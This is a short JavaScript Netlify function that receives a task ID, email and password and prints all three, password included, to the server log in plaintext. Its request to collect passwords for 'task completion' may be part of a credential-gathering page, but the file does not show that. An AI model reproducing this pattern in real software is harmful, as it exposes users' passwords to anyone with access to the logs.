// netlify/functions/confirm-task.js
exports.handler = async (event, context) => {
  const { taskId, email, password } = JSON.parse(event.body);

  if (!taskId || !email || !password) {
    return {
      statusCode: 400,
      body: JSON.stringify({ success: false, message: 'Missing task details' }),
    };
  }

  try {
    // In a real implementation, you'd save the task completion details to a database
    console.log(`Task ${taskId} completed with email: ${email} and password: ${password}`);
    
    return {
      statusCode: 200,
      body: JSON.stringify({ success: true, message: 'Task submitted successfully' }),
    };
  } catch (error) {
    console.error('Error confirming task:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ success: false, message: 'Error confirming task' }),
    };
  }
};
